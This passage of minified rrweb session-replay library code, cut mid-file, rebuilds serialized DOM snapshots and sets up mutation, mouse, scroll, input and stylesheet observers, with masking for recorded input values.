                    if (!(a === "option" && l === "selected" && c === !1)) {
                        if (c === !0 && (c = ""), l.startsWith("rr_")) {
                            i[l] = c;
                            continue
                        }
                        var u = a === "textarea" && l === "value", d = a === "style" && l === "_cssText";
                        if (d && r && typeof c == "string" && (c = Pt(c, o)), (u || d) && typeof c == "string") {
                            for (var h = n.createTextNode(c), p = 0, m = Array.from(s.childNodes); p < m.length; p++) {
                                var b = m[p];
                                b.nodeType === s.TEXT_NODE && s.removeChild(b)
                            }
                            s.appendChild(h);
                            continue
                        }
                        try {
                            if (t.isSVG && l === "xlink:href") s.setAttributeNS("http://www.w3.org/1999/xlink", l, c.toString()); else if (l === "onload" || l === "onclick" || l.substring(0, 7) === "onmouse") s.setAttribute("_" + l, c.toString()); else if (a === "meta" && t.attributes["http-equiv"] === "Content-Security-Policy" && l === "content") {
                                s.setAttribute("csp-content", c.toString());
                                continue
                            } else a === "link" && t.attributes.rel === "preload" && t.attributes.as === "script" || a === "link" && t.attributes.rel === "prefetch" && typeof t.attributes.href == "string" && t.attributes.href.endsWith(".js") || (a === "img" && t.attributes.srcset && t.attributes.rr_dataURL ? s.setAttribute("rrweb-original-srcset", t.attributes.srcset) : s.setAttribute(l, c.toString()))
                        } catch {
                        }
                    }
                }
                var S = function (y) {
                    var g = i[y];
                    if (a === "canvas" && y === "rr_dataURL") {
                        var E = document.createElement("img");
                        E.onload = function () {
                            var x = s.getContext("2d");
                            x && x.drawImage(E, 0, 0, E.width, E.height)
                        }, E.src = g.toString(), s.RRNodeType && (s.rr_dataURL = g.toString())
                    } else if (a === "img" && y === "rr_dataURL") {
                        var k = s;
                        k.currentSrc.startsWith("data:") || (k.setAttribute("rrweb-original-src", t.attributes.src), k.src = g.toString())
                    }
                    if (y === "rr_width") s.style.width = g.toString(); else if (y === "rr_height") s.style.height = g.toString(); else if (y === "rr_mediaCurrentTime" && typeof g == "number") s.currentTime = g; else if (y === "rr_mediaState") switch (g) {
                        case"played":
                            s.play().catch(function (x) {
                                return console.warn("media playback error", x)
                            });
                            break;
                        case"paused":
                            s.pause();
                            break
                    }
                };
                for (var f in i) S(f);
                if (t.isShadowHost) if (!s.shadowRoot) s.attachShadow({mode: "open"}); else for (; s.shadowRoot.firstChild;) s.shadowRoot.removeChild(s.shadowRoot.firstChild);
                return s
            }
            case D.Text:
                return n.createTextNode(t.isStyle && r ? Pt(t.textContent, o) : t.textContent);
            case D.CDATA:
                return n.createCDATASection(t.textContent);
            case D.Comment:
                return n.createComment(t.textContent);
            default:
                return null
        }
    }

    function _e(t, e) {
        var n = e.doc, r = e.mirror, o = e.skipChild, a = o === void 0 ? !1 : o, s = e.hackCss,
            i = s === void 0 ? !0 : s, l = e.afterAppend, c = e.cache, u = Cr(t, {doc: n, hackCss: i, cache: c});
        if (!u) return null;
        if (t.rootId && r.getNode(t.rootId) !== n && r.replace(t.rootId, n), t.type === D.Document && (n.close(), n.open(), t.compatMode === "BackCompat" && t.childNodes && t.childNodes[0].type !== D.DocumentType && (t.childNodes[0].type === D.Element && "xmlns" in t.childNodes[0].attributes && t.childNodes[0].attributes.xmlns === "http://www.w3.org/1999/xhtml" ? n.write('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "">') : n.write('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "">')), u = n), r.add(u, t), (t.type === D.Document || t.type === D.Element) && !a) for (var d = 0, h = t.childNodes; d < h.length; d++) {
            var p = h[d], m = _e(p, {doc: n, mirror: r, skipChild: !1, hackCss: i, afterAppend: l, cache: c});
            if (!m) {
                console.warn("Failed to rebuild", p);
                continue
            }
            p.isShadow && Tt(u) && u.shadowRoot ? u.shadowRoot.appendChild(m) : u.appendChild(m), l && l(m, p.id)
        }
        return u
    }

    function Ir(t, e) {
        function n(s) {
            e(s)
        }

        for (var r = 0, o = t.getIds(); r < o.length; r++) {
            var a = o[r];
            t.has(a) && n(t.getNode(a))
        }
    }

    function Tr(t, e) {
        var n = e.getMeta(t);
        if (n?.type === D.Element) {
            var r = t;
            for (var o in n.attributes) if (Object.prototype.hasOwnProperty.call(n.attributes, o) && o.startsWith("rr_")) {
                var a = n.attributes[o];
                o === "rr_scrollLeft" && (r.scrollLeft = a), o === "rr_scrollTop" && (r.scrollTop = a)
            }
        }
    }

    function Mr(t, e) {
        var n = e.doc, r = e.onVisit, o = e.hackCss, a = o === void 0 ? !0 : o, s = e.afterAppend, i = e.cache,
            l = e.mirror, c = l === void 0 ? new qe : l,
            u = _e(t, {doc: n, mirror: c, skipChild: !1, hackCss: a, afterAppend: s, cache: i});
        return Ir(c, function (d) {
            r && r(d), Tr(d, c)
        }), u
    }

    function K(t, e, n = document) {
        const r = {capture: !0, passive: !0};
        return n.addEventListener(t, e, r), () => n.removeEventListener(t, e, r)
    }

    const Ne = `Please stop import mirror directly. Instead of that,\r
now you can use replayer.getMirror() to access the mirror instance of a replayer,\r
or you can use record.mirror to access the mirror instance during recording.`;
    ee.mirror = {
        map: {}, getId() {
            return console.error(Ne), -1
        }, getNode() {
            return console.error(Ne), null
        }, removeNodeFromMap() {
            console.error(Ne)
        }, has() {
            return console.error(Ne), !1
        }, reset() {
            console.error(Ne)
        }
    }, typeof window < "u" && window.Proxy && window.Reflect && (ee.mirror = new Proxy(ee.mirror, {
        get(t, e, n) {
            return e === "map" && console.error(Ne), Reflect.get(t, e, n)
        }
    }));

    function Ce(t, e, n = {}) {
        let r = null, o = 0;
        return function (...a) {
            const s = Date.now();
            !o && n.leading === !1 && (o = s);
            const i = e - (s - o), l = this;
            i <= 0 || i > e ? (r && (clearTimeout(r), r = null), o = s, t.apply(l, a)) : !r && n.trailing !== !1 && (r = setTimeout(() => {
                o = n.leading === !1 ? 0 : Date.now(), r = null, t.apply(l, a)
            }, i))
        }
    }

    function Fe(t, e, n, r, o = window) {
        const a = o.Object.getOwnPropertyDescriptor(t, e);
        return o.Object.defineProperty(t, e, r ? n : {
            set(s) {
                setTimeout(() => {
                    n.set.call(this, s)
                }, 0), a && a.set && a.set.call(this, s)
            }
        }), () => Fe(t, e, a || {}, !0)
    }

    function ge(t, e, n) {
        try {
            if (!(e in t)) return () => {
            };
            const r = t[e], o = n(r);
            return typeof o == "function" && (o.prototype = o.prototype || {}, Object.defineProperties(o, {
                __rrweb_original__: {
                    enumerable: !1,
                    value: r
                }
            })), t[e] = o, () => {
                t[e] = r
            }
        } catch {
            return () => {
            }
        }
    }

    function rt() {
        return window.innerHeight || document.documentElement && document.documentElement.clientHeight || document.body && document.body.clientHeight
    }

    function ot() {
        return window.innerWidth || document.documentElement && document.documentElement.clientWidth || document.body && document.body.clientWidth
    }

    function Q(t, e, n, r) {
        if (!t) return !1;
        const o = t.nodeType === t.ELEMENT_NODE ? t : t.parentElement;
        if (!o) return !1;
        if (typeof e == "string") {
            if (o.classList.contains(e) || r && o.closest("." + e) !== null) return !0
        } else if (Ge(o, e, r)) return !0;
        return !!(n && (t.matches(n) || r && o.closest(n) !== null))
    }

    function $t(t, e) {
        return e.getId(t) !== -1
    }

    function je(t, e) {
        return e.getId(t) === Ae
    }

    function st(t, e) {
        if (Oe(t)) return !1;
        const n = e.getId(t);
        return e.has(n) ? t.parentNode && t.parentNode.nodeType === t.DOCUMENT_NODE ? !1 : t.parentNode ? st(t.parentNode, e) : !0 : !0
    }

    function it(t) {
        return Boolean(t.changedTouches)
    }

    function at(t = window) {
        "NodeList" in t && !t.NodeList.prototype.forEach && (t.NodeList.prototype.forEach = Array.prototype.forEach), "DOMTokenList" in t && !t.DOMTokenList.prototype.forEach && (t.DOMTokenList.prototype.forEach = Array.prototype.forEach), Node.prototype.contains || (Node.prototype.contains = (...e) => {
            let n = e[0];
            if (!(0 in e)) throw new TypeError("1 argument is required");
            do if (this === n) return !0; while (n = n && n.parentNode);
            return !1
        })
    }

    function Ut(t) {
        const e = {}, n = (o, a) => {
            const s = {value: o, parent: a, children: []};
            return e[o.node.id] = s, s
        }, r = [];
        for (const o of t) {
            const {nextId: a, parentId: s} = o;
            if (a && a in e) {
                const i = e[a];
                if (i.parent) {
                    const l = i.parent.children.indexOf(i);
                    i.parent.children.splice(l, 0, n(o, i.parent))
                } else {
                    const l = r.indexOf(i);
                    r.splice(l, 0, n(o, null))
                }
                continue
            }
            if (s in e) {
                const i = e[s];
                i.children.push(n(o, i));
                continue
            }
            r.push(n(o, null))
        }
        return r
    }

    function lt(t, e) {
        e(t.value);
        for (let n = t.children.length - 1; n >= 0; n--) lt(t.children[n], e)
    }

    function Ie(t, e) {
        return Boolean(t.nodeName === "IFRAME" && e.getMeta(t))
    }

    function ct(t, e) {
        return Boolean(t.nodeName === "LINK" && t.nodeType === t.ELEMENT_NODE && t.getAttribute && t.getAttribute("rel") === "stylesheet" && e.getMeta(t))
    }

    function ut(t, e) {
        var n, r;
        const o = (r = (n = t.ownerDocument) == null ? void 0 : n.defaultView) == null ? void 0 : r.frameElement;
        if (!o || o === e) return {x: 0, y: 0, relativeScale: 1, absoluteScale: 1};
        const a = o.getBoundingClientRect(), s = ut(o, e), i = a.height / o.clientHeight;
        return {
            x: a.x * s.relativeScale + s.x,
            y: a.y * s.relativeScale + s.y,
            relativeScale: i,
            absoluteScale: s.absoluteScale * i
        }
    }

    function ve(t) {
        return Boolean(t?.shadowRoot)
    }

    function Te(t, e) {
        const n = t[e[0]];
        return e.length === 1 ? n : Te(n.cssRules[e[1]].cssRules, e.slice(2))
    }

    function dt(t) {
        const e = [...t], n = e.pop();
        return {positions: e, index: n}
    }

    function Vt(t) {
        const e = new Set, n = [];
        for (let r = t.length; r--;) {
            const o = t[r];
            e.has(o.id) || (n.push(o), e.add(o.id))
        }
        return n
    }

    class ht {
        constructor() {
            this.id = 1, this.styleIDMap = new WeakMap, this.idStyleMap = new Map
        }

        getId(e) {
            var n;
            return (n = this.styleIDMap.get(e)) != null ? n : -1
        }

        has(e) {
            return this.styleIDMap.has(e)
        }

        add(e, n) {
            if (this.has(e)) return this.getId(e);
            let r;
            return n === void 0 ? r = this.id++ : r = n, this.styleIDMap.set(e, r), this.idStyleMap.set(r, e), r
        }

        getStyle(e) {
            return this.idStyleMap.get(e) || null
        }

        reset() {
            this.styleIDMap = new WeakMap, this.idStyleMap = new Map, this.id = 1
        }

        generateId() {
            return this.id++
        }
    }

    var kr = Object.freeze({
            __proto__: null,
            on: K,
            get _mirror() {
                return ee.mirror
            },
            throttle: Ce,
            hookSetter: Fe,
            patch: ge,
            getWindowHeight: rt,
            getWindowWidth: ot,
            isBlocked: Q,
            isSerialized: $t,
            isIgnored: je,
            isAncestorRemoved: st,
            isTouchEvent: it,
            polyfill: at,
            queueToResolveTrees: Ut,
            iterateResolveTree: lt,
            isSerializedIframe: Ie,
            isSerializedStylesheet: ct,
            getBaseDimension: ut,
            hasShadowRoot: ve,
            getNestedRule: Te,
            getPositionsAndIndex: dt,
            uniqueTextMutations: Vt,
            StyleSheetMirror: ht
        }),
        C = (t => (t[t.DomContentLoaded = 0] = "DomContentLoaded", t[t.Load = 1] = "Load", t[t.FullSnapshot = 2] = "FullSnapshot", t[t.IncrementalSnapshot = 3] = "IncrementalSnapshot", t[t.Meta = 4] = "Meta", t[t.Custom = 5] = "Custom", t[t.Plugin = 6] = "Plugin", t))(C || {}),
        N = (t => (t[t.Mutation = 0] = "Mutation", t[t.MouseMove = 1] = "MouseMove", t[t.MouseInteraction = 2] = "MouseInteraction", t[t.Scroll = 3] = "Scroll", t[t.ViewportResize = 4] = "ViewportResize", t[t.Input = 5] = "Input", t[t.TouchMove = 6] = "TouchMove", t[t.MediaInteraction = 7] = "MediaInteraction", t[t.StyleSheetRule = 8] = "StyleSheetRule", t[t.CanvasMutation = 9] = "CanvasMutation", t[t.Font = 10] = "Font", t[t.Log = 11] = "Log", t[t.Drag = 12] = "Drag", t[t.StyleDeclaration = 13] = "StyleDeclaration", t[t.Selection = 14] = "Selection", t[t.AdoptedStyleSheet = 15] = "AdoptedStyleSheet", t))(N || {}),
        j = (t => (t[t.MouseUp = 0] = "MouseUp", t[t.MouseDown = 1] = "MouseDown", t[t.Click = 2] = "Click", t[t.ContextMenu = 3] = "ContextMenu", t[t.DblClick = 4] = "DblClick", t[t.Focus = 5] = "Focus", t[t.Blur = 6] = "Blur", t[t.TouchStart = 7] = "TouchStart", t[t.TouchMove_Departed = 8] = "TouchMove_Departed", t[t.TouchEnd = 9] = "TouchEnd", t[t.TouchCancel = 10] = "TouchCancel", t))(j || {}),
        pe = (t => (t[t["2D"] = 0] = "2D", t[t.WebGL = 1] = "WebGL", t[t.WebGL2 = 2] = "WebGL2", t))(pe || {}),
        me = (t => (t[t.Play = 0] = "Play", t[t.Pause = 1] = "Pause", t[t.Seeked = 2] = "Seeked", t[t.VolumeChange = 3] = "VolumeChange", t[t.RateChange = 4] = "RateChange", t))(me || {}),
        O = (t => (t.Start = "start", t.Pause = "pause", t.Resume = "resume", t.Resize = "resize", t.Finish = "finish", t.FullsnapshotRebuilded = "fullsnapshot-rebuilded", t.LoadStylesheetStart = "load-stylesheet-start", t.LoadStylesheetEnd = "load-stylesheet-end", t.SkipStart = "skip-start", t.SkipEnd = "skip-end", t.MouseInteraction = "mouse-interaction", t.EventCast = "event-cast", t.CustomEvent = "custom-event", t.Flush = "flush", t.StateChange = "state-change", t.PlayBack = "play-back", t.Destroy = "destroy", t))(O || {});

    function Bt(t) {
        return "__ln" in t
    }

    class Dr {
        constructor() {
            this.length = 0, this.head = null
        }

        get(e) {
            if (e >= this.length) throw new Error("Position outside of list range");
            let n = this.head;
            for (let r = 0; r < e; r++) n = n?.next || null;
            return n
        }

        addNode(e) {
            const n = {value: e, previous: null, next: null};
            if (e.__ln = n, e.previousSibling && Bt(e.previousSibling)) {
                const r = e.previousSibling.__ln.next;
                n.next = r, n.previous = e.previousSibling.__ln, e.previousSibling.__ln.next = n, r && (r.previous = n)
            } else if (e.nextSibling && Bt(e.nextSibling) && e.nextSibling.__ln.previous) {
                const r = e.nextSibling.__ln.previous;
                n.previous = r, n.next = e.nextSibling.__ln, e.nextSibling.__ln.previous = n, r && (r.next = n)
            } else this.head && (this.head.previous = n), n.next = this.head, this.head = n;
            this.length++
        }

        removeNode(e) {
            const n = e.__ln;
            !this.head || (n.previous ? (n.previous.next = n.next, n.next && (n.next.previous = n.previous)) : (this.head = n.next, this.head && (this.head.previous = null)), e.__ln && delete e.__ln, this.length--)
        }
    }

    const Gt = (t, e) => `${t}@${e}`;

    class Rr {
        constructor() {
            this.frozen = !1, this.locked = !1, this.texts = [], this.attributes = [], this.removes = [], this.mapRemoves = [], this.movedMap = {}, this.addedSet = new Set, this.movedSet = new Set, this.droppedSet = new Set, this.processMutations = e => {
                e.forEach(this.processMutation), this.emit()
            }, this.emit = () => {
                if (this.frozen || this.locked) return;
                const e = [], n = new Dr, r = i => {
                    let l = i, c = Ae;
                    for (; c === Ae;) l = l && l.nextSibling, c = l && this.mirror.getId(l);
                    return c
                }, o = i => {
                    var l, c, u, d;
                    let h = null;
                    ((c = (l = i.getRootNode) == null ? void 0 : l.call(i)) == null ? void 0 : c.nodeType) === Node.DOCUMENT_FRAGMENT_NODE && i.getRootNode().host && (h = i.getRootNode().host);
                    let p = h;
                    for (; ((d = (u = p?.getRootNode) == null ? void 0 : u.call(p)) == null ? void 0 : d.nodeType) === Node.DOCUMENT_FRAGMENT_NODE && p.getRootNode().host;) p = p.getRootNode().host;
                    const m = !this.doc.contains(i) && (!p || !this.doc.contains(p));
                    if (!i.parentNode || m) return;
                    const b = Oe(i.parentNode) ? this.mirror.getId(h) : this.mirror.getId(i.parentNode), S = r(i);
                    if (b === -1 || S === -1) return n.addNode(i);
                    const f = Ee(i, {
                        doc: this.doc,
                        mirror: this.mirror,
                        blockClass: this.blockClass,
                        blockSelector: this.blockSelector,
                        maskTextClass: this.maskTextClass,
                        maskTextSelector: this.maskTextSelector,
                        skipChild: !0,
                        newlyAddedElement: !0,
                        inlineStylesheet: this.inlineStylesheet,
                        maskInputOptions: this.maskInputOptions,
                        maskTextFn: this.maskTextFn,
                        maskInputFn: this.maskInputFn,
                        slimDOMOptions: this.slimDOMOptions,
                        dataURLOptions: this.dataURLOptions,
                        recordCanvas: this.recordCanvas,
                        inlineImages: this.inlineImages,
                        onSerialize: y => {
                            Ie(y, this.mirror) && this.iframeManager.addIframe(y), ct(y, this.mirror) && this.stylesheetManager.trackLinkElement(y), ve(i) && this.shadowDomManager.addShadowRoot(i.shadowRoot, this.doc)
                        },
                        onIframeLoad: (y, g) => {
                            this.iframeManager.attachIframe(y, g), this.shadowDomManager.observeAttachShadow(y)
                        },
                        onStylesheetLoad: (y, g) => {
                            this.stylesheetManager.attachLinkElement(y, g)
                        }
                    });
                    f && e.push({parentId: b, nextId: S, node: f})
                };
                for (; this.mapRemoves.length;) this.mirror.removeNodeFromMap(this.mapRemoves.shift());
                for (const i of Array.from(this.movedSet.values())) jt(this.removes, i, this.mirror) && !this.movedSet.has(i.parentNode) || o(i);
                for (const i of Array.from(this.addedSet.values())) !Ht(this.droppedSet, i) && !jt(this.removes, i, this.mirror) || Ht(this.movedSet, i) ? o(i) : this.droppedSet.add(i);
                let a = null;
                for (; n.length;) {
                    let i = null;
                    if (a) {
                        const l = this.mirror.getId(a.value.parentNode), c = r(a.value);
                        l !== -1 && c !== -1 && (i = a)
                    }
                    if (!i) for (let l = n.length - 1; l >= 0; l--) {
                        const c = n.get(l);
                        if (c) {
                            const u = this.mirror.getId(c.value.parentNode);
                            if (r(c.value) === -1) continue;
                            if (u !== -1) {
                                i = c;
                                break
                            } else {
                                const d = c.value;
                                if (d.parentNode && d.parentNode.nodeType === Node.DOCUMENT_FRAGMENT_NODE) {
                                    const h = d.parentNode.host;
                                    if (this.mirror.getId(h) !== -1) {
                                        i = c;
                                        break
                                    }
                                }
                            }
                        }
                    }
                    if (!i) {
                        for (; n.head;) n.removeNode(n.head.value);
                        break
                    }
                    a = i.previous, n.removeNode(i.value), o(i.value)
                }
                const s = {
                    texts: this.texts.map(i => ({
                        id: this.mirror.getId(i.node),
                        value: i.value
                    })).filter(i => this.mirror.has(i.id)),
                    attributes: this.attributes.map(i => ({
                        id: this.mirror.getId(i.node),
                        attributes: i.attributes
                    })).filter(i => this.mirror.has(i.id)),
                    removes: this.removes,
                    adds: e
                };
                !s.texts.length && !s.attributes.length && !s.removes.length && !s.adds.length || (this.texts = [], this.attributes = [], this.removes = [], this.addedSet = new Set, this.movedSet = new Set, this.droppedSet = new Set, this.movedMap = {}, this.mutationCb(s))
            }, this.processMutation = e => {
                if (!je(e.target, this.mirror)) switch (e.type) {
                    case"characterData": {
                        const n = e.target.textContent;
                        !Q(e.target, this.blockClass, this.blockSelector, !1) && n !== e.oldValue && this.texts.push({
                            value: Lt(e.target, this.maskTextClass, this.maskTextSelector) && n ? this.maskTextFn ? this.maskTextFn(n) : n.replace(/[\S]/g, "*") : n,
                            node: e.target
                        });
                        break
                    }
                    case"attributes": {
                        const n = e.target;
                        let r = e.target.getAttribute(e.attributeName);
                        if (e.attributeName === "value" && (r = et({
                            maskInputOptions: this.maskInputOptions,
                            tagName: e.target.tagName,
                            type: e.target.getAttribute("type"),
                            value: r,
                            maskInputFn: this.maskInputFn
                        })), Q(e.target, this.blockClass, this.blockSelector, !1) || r === e.oldValue) return;
                        let o = this.attributes.find(a => a.node === e.target);
                        if (n.tagName === "IFRAME" && e.attributeName === "src" && !this.keepIframeSrcFn(r)) if (!n.contentDocument) e.attributeName = "rr_src"; else return;
                        if (o || (o = {
                            node: e.target,
                            attributes: {}
                        }, this.attributes.push(o)), e.attributeName === "style") {
                            const a = this.doc.createElement("span");
                            e.oldValue && a.setAttribute("style", e.oldValue), (o.attributes.style === void 0 || o.attributes.style === null) && (o.attributes.style = {});
                            const s = o.attributes.style;
                            for (const i of Array.from(n.style)) {
                                const l = n.style.getPropertyValue(i), c = n.style.getPropertyPriority(i);
                                (l !== a.style.getPropertyValue(i) || c !== a.style.getPropertyPriority(i)) && (c === "" ? s[i] = l : s[i] = [l, c])
                            }
                            for (const i of Array.from(a.style)) n.style.getPropertyValue(i) === "" && (s[i] = !1)
                        } else o.attributes[e.attributeName] = Ot(this.doc, n.tagName, e.attributeName, r);
                        break
                    }
                    case"childList": {
                        if (Q(e.target, this.blockClass, this.blockSelector, !0)) return;
                        e.addedNodes.forEach(n => this.genAdds(n, e.target)), e.removedNodes.forEach(n => {
                            const r = this.mirror.getId(n),
                                o = Oe(e.target) ? this.mirror.getId(e.target.host) : this.mirror.getId(e.target);
                            Q(e.target, this.blockClass, this.blockSelector, !1) || je(n, this.mirror) || !$t(n, this.mirror) || (this.addedSet.has(n) ? (pt(this.addedSet, n), this.droppedSet.add(n)) : this.addedSet.has(e.target) && r === -1 || st(e.target, this.mirror) || (this.movedSet.has(n) && this.movedMap[Gt(r, o)] ? pt(this.movedSet, n) : this.removes.push({
                                parentId: o,
                                id: r,
                                isShadow: Oe(e.target) && Le(e.target) ? !0 : void 0
                            })), this.mapRemoves.push(n))
                        });
                        break
                    }
                }
            }, this.genAdds = (e, n) => {
                if (this.mirror.hasNode(e)) {
                    if (je(e, this.mirror)) return;
                    this.movedSet.add(e);
                    let r = null;
                    n && this.mirror.hasNode(n) && (r = this.mirror.getId(n)), r && r !== -1 && (this.movedMap[Gt(this.mirror.getId(e), r)] = !0)
                } else this.addedSet.add(e), this.droppedSet.delete(e);
                Q(e, this.blockClass, this.blockSelector, !1) || e.childNodes.forEach(r => this.genAdds(r))
            }
        }

        init(e) {
            ["mutationCb", "blockClass", "blockSelector", "maskTextClass", "maskTextSelector", "inlineStylesheet", "maskInputOptions", "maskTextFn", "maskInputFn", "keepIframeSrcFn", "recordCanvas", "inlineImages", "slimDOMOptions", "dataURLOptions", "doc", "mirror", "iframeManager", "stylesheetManager", "shadowDomManager", "canvasManager"].forEach(n => {
                this[n] = e[n]
            })
        }

        freeze() {
            this.frozen = !0, this.canvasManager.freeze()
        }

        unfreeze() {
            this.frozen = !1, this.canvasManager.unfreeze(), this.emit()
        }

        isFrozen() {
            return this.frozen
        }

        lock() {
            this.locked = !0, this.canvasManager.lock()
        }

        unlock() {
            this.locked = !1, this.canvasManager.unlock(), this.emit()
        }

        reset() {
            this.shadowDomManager.reset(), this.canvasManager.reset()
        }
    }

    function pt(t, e) {
        t.delete(e), e.childNodes.forEach(n => pt(t, n))
    }

    function jt(t, e, n) {
        return t.length === 0 ? !1 : zt(t, e, n)
    }

    function zt(t, e, n) {
        const {parentNode: r} = e;
        if (!r) return !1;
        const o = n.getId(r);
        return t.some(a => a.id === o) ? !0 : zt(t, r, n)
    }

    function Ht(t, e) {
        return t.size === 0 ? !1 : Yt(t, e)
    }

    function Yt(t, e) {
        const {parentNode: n} = e;
        return n ? t.has(n) ? !0 : Yt(t, n) : !1
    }

    var xr = Object.defineProperty, Or = Object.defineProperties, Lr = Object.getOwnPropertyDescriptors,
        Xt = Object.getOwnPropertySymbols, Ar = Object.prototype.hasOwnProperty,
        _r = Object.prototype.propertyIsEnumerable,
        Zt = (t, e, n) => e in t ? xr(t, e, {enumerable: !0, configurable: !0, writable: !0, value: n}) : t[e] = n,
        Kt = (t, e) => {
            for (var n in e || (e = {})) Ar.call(e, n) && Zt(t, n, e[n]);
            if (Xt) for (var n of Xt(e)) _r.call(e, n) && Zt(t, n, e[n]);
            return t
        }, Fr = (t, e) => Or(t, Lr(e));
    const Se = [], Qt = typeof CSSGroupingRule < "u", Jt = typeof CSSMediaRule < "u", qt = typeof CSSSupportsRule < "u",
        en = typeof CSSConditionRule < "u";

    function Pe(t) {
        try {
            if ("composedPath" in t) {
                const e = t.composedPath();
                if (e.length) return e[0]
            } else if ("path" in t && t.path.length) return t.path[0];
            return t.target
        } catch {
            return t.target
        }
    }

    function tn(t, e) {
        var n, r;
        const o = new Rr;
        Se.push(o), o.init(t);
        let a = window.MutationObserver || window.__rrMutationObserver;
        const s = (r = (n = window?.Zone) == null ? void 0 : n.__symbol__) == null ? void 0 : r.call(n, "MutationObserver");
        s && window[s] && (a = window[s]);
        const i = new a(o.processMutations.bind(o));
        return i.observe(e, {
            attributes: !0,
            attributeOldValue: !0,
            characterData: !0,
            characterDataOldValue: !0,
            childList: !0,
            subtree: !0
        }), i
    }

    function Pr({mousemoveCb: t, sampling: e, doc: n, mirror: r}) {
        if (e.mousemove === !1) return () => {
        };
        const o = typeof e.mousemove == "number" ? e.mousemove : 50,
            a = typeof e.mousemoveCallback == "number" ? e.mousemoveCallback : 500;
        let s = [], i;
        const l = Ce(d => {
            const h = Date.now() - i;
            t(s.map(p => (p.timeOffset -= h, p)), d), s = [], i = null
        }, a), c = Ce(d => {
            const h = Pe(d), {clientX: p, clientY: m} = it(d) ? d.changedTouches[0] : d;
            i || (i = Date.now()), s.push({
                x: p,
                y: m,
                id: r.getId(h),
                timeOffset: Date.now() - i
            }), l(typeof DragEvent < "u" && d instanceof DragEvent ? N.Drag : d instanceof MouseEvent ? N.MouseMove : N.TouchMove)
        }, o, {trailing: !1}), u = [K("mousemove", c, n), K("touchmove", c, n), K("drag", c, n)];
        return () => {
            u.forEach(d => d())
        }
    }

    function Wr({mouseInteractionCb: t, doc: e, mirror: n, blockClass: r, blockSelector: o, sampling: a}) {
        if (a.mouseInteraction === !1) return () => {
        };
        const s = a.mouseInteraction === !0 || a.mouseInteraction === void 0 ? {} : a.mouseInteraction, i = [],
            l = c => u => {
                const d = Pe(u);
                if (Q(d, r, o, !0)) return;
                const h = it(u) ? u.changedTouches[0] : u;
                if (!h) return;
                const p = n.getId(d), {clientX: m, clientY: b} = h;
                t({type: j[c], id: p, x: m, y: b})
            };
        return Object.keys(j).filter(c => Number.isNaN(Number(c)) && !c.endsWith("_Departed") && s[c] !== !1).forEach(c => {
            const u = c.toLowerCase(), d = l(c);
            i.push(K(u, d, e))
        }), () => {
            i.forEach(c => c())
        }
    }

    function nn({scrollCb: t, doc: e, mirror: n, blockClass: r, blockSelector: o, sampling: a}) {
        const s = Ce(i => {
            const l = Pe(i);
            if (!l || Q(l, r, o, !0)) return;
            const c = n.getId(l);
            if (l === e) {
                const u = e.scrollingElement || e.documentElement;
                t({id: c, x: u.scrollLeft, y: u.scrollTop})
            } else t({id: c, x: l.scrollLeft, y: l.scrollTop})
        }, a.scroll || 100);
        return K("scroll", s, e)
    }

    function $r({viewportResizeCb: t}) {
        let e = -1, n = -1;
        const r = Ce(() => {
            const o = rt(), a = ot();
            (e !== o || n !== a) && (t({width: Number(a), height: Number(o)}), e = o, n = a)
        }, 200);
        return K("resize", r, window)
    }

    function rn(t, e) {
        const n = Kt({}, t);
        return e || delete n.userTriggered, n
    }

    const Ur = ["INPUT", "TEXTAREA", "SELECT"], on = new WeakMap;

    function Vr({
                    inputCb: t,
                    doc: e,
                    mirror: n,
                    blockClass: r,
                    blockSelector: o,
                    ignoreClass: a,
                    maskInputOptions: s,
                    maskInputFn: i,
                    sampling: l,
                    userTriggeredOnInput: c
                }) {
        function u(S) {
            let f = Pe(S);
            const y = S.isTrusted;
            if (f && f.tagName === "OPTION" && (f = f.parentElement), !f || !f.tagName || Ur.indexOf(f.tagName) < 0 || Q(f, r, o, !0)) return;
            const g = f.type;
            if (f.classList.contains(a)) return;
            let E = f.value, k = !1;
            g === "radio" || g === "checkbox" ? k = f.checked : (s[f.tagName.toLowerCase()] || s[g]) && (E = et({
                maskInputOptions: s,
                tagName: f.tagName,
                type: g,
                value: E,
                maskInputFn: i
            })), d(f, rn({text: E, isChecked: k, userTriggered: y}, c));
            const x = f.name;
            g === "radio" && x && k && e.querySelectorAll(`input[type="radio"][name="${x}"]`).forEach(F => {
                F !== f && d(F, rn({text: F.value, isChecked: !k, userTriggered: !1}, c))
            })
        }

        function d(S, f) {
            const y = on.get(S);
            if (!y || y.text !== f.text || y.isChecked !== f.isChecked) {
                on.set(S, f);
                const g = n.getId(S);
                t(Fr(Kt({}, f), {id: g}))
            }
        }

        const h = (l.input === "last" ? ["change"] : ["input", "change"]).map(S => K(S, u, e)), p = e.defaultView;
        if (!p) return () => {
            h.forEach(S => S())
        };
        const m = p.Object.getOwnPropertyDescriptor(p.HTMLInputElement.prototype, "value"),
            b = [[p.HTMLInputElement.prototype, "value"], [p.HTMLInputElement.prototype, "checked"], [p.HTMLSelectElement.prototype, "value"], [p.HTMLTextAreaElement.prototype, "value"], [p.HTMLSelectElement.prototype, "selectedIndex"], [p.HTMLOptionElement.prototype, "selected"]];
        return m && m.set && h.push(...b.map(S => Fe(S[0], S[1], {
            set() {
                u({target: this})
            }
        }, !1, p))), () => {
            h.forEach(S => S())
        }
    }

    function ze(t) {
        const e = [];

        function n(r, o) {
            if (Qt && r.parentRule instanceof CSSGroupingRule || Jt && r.parentRule instanceof CSSMediaRule || qt && r.parentRule instanceof CSSSupportsRule || en && r.parentRule instanceof CSSConditionRule) {
                const a = Array.from(r.parentRule.cssRules).indexOf(r);
                o.unshift(a)
            } else if (r.parentStyleSheet) {
                const a = Array.from(r.parentStyleSheet.cssRules).indexOf(r);
                o.unshift(a)
            }
            return o
        }

        return n(t, e)
    }

    function fe(t, e, n) {
        let r, o;
        return t ? (t.ownerNode ? r = e.getId(t.ownerNode) : o = n.getId(t), {styleId: o, id: r}) : {}
    }

    function Br({styleSheetRuleCb: t, mirror: e, stylesheetManager: n}, {win: r}) {
        const o = r.CSSStyleSheet.prototype.insertRule;
        r.CSSStyleSheet.prototype.insertRule = function (u, d) {
            const {id: h, styleId: p} = fe(this, e, n.styleMirror);
            return (h && h !== -1 || p && p !== -1) && t({
                id: h,
                styleId: p,
                adds: [{rule: u, index: d}]
            }), o.apply(this, [u, d])
        };
